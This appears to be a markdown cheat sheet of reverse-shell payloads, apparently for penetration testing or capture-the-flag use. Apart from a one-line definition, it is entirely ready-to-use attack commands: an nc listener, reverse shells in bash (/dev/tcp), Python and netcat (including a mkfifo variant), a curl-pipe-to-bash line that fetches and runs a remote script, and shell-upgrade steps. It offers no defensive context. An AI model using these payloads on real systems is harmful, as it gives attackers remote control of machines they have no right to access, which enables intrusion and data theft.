# REVERSE SHELL

## What is it
A technique used to gain remote access to a target machine by establishing a reverse connection from the target to the attacker's listener.

---

## Payloads

### Listener (attacker side)
```bash
nc -lvnp 4444
```

### Bash (common)
```bash
bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1
```

### Python (reliable)
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<YOUR_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Netcat (if supported)
```bash
nc <YOUR_IP> 4444 -e /bin/bash
```

If `-e` is blocked, use:
```bash
mkfifo /tmp/f; nc <YOUR_IP> 4444 < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f
```

### Curl + script (simple)
```bash
curl http://<YOUR_IP>:8000/shell.sh | bash
```

### Upgrade shell
Once you get a shell, upgrade it:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'

export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
stty rows 50 columns 200
```